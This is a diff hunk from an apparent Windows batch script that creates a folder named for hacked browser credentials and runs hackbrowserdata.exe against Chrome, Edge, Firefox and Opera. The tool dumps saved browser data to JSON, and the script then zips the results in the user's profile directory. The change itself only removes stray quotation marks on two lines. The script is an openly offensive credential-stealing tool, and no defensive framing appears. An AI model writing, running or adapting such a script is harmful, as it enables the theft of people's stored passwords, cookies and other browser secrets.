@@ -17,8 +17,8 @@ mkdir Hacked-Browsers-Credintionals
 cd Hacked-Browsers-Credintionals
 %~dp0hackbrowserdata.exe -b chrome -f json --results-dir Chrome
 %~dp0hackbrowserdata.exe -b edge -f json --results-dir Microsoft-Edge
-%~dp0hackbrowserdata.exe -b firefox -f json --results-dir FireFox"
-%~dp0hackbrowserdata.exe -b opera -f json --results-dir Opera"
+%~dp0hackbrowserdata.exe -b firefox -f json --results-dir FireFox
+%~dp0hackbrowserdata.exe -b opera -f json --results-dir Opera
 cd ..
 cd %USERPROFILE%
 powershell -c Compress-Archive "Results4HackedPC" "Results4HackedPC.zip"
